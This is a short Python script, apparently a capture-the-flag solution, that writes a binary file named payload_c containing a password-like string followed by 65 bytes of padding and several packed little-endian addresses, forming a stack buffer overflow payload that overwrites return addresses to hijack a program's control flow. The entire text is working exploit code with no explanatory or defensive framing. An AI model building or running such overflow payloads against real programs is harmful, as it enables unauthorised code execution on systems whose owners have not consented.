import struct
def dw(i):
    return struct.pack("<I",i)
offset = 65
payload = 'NOP\nIDA_1z_y0ur_fr1end\n'
payload += 'A' * offset + dw(1756) + 'A' * 12 + dw(1878438596) + 'A' * 4 + dw(4235652) + dw(4235667)
with open('payload_c', 'wb') as f:
    f.write(payload)
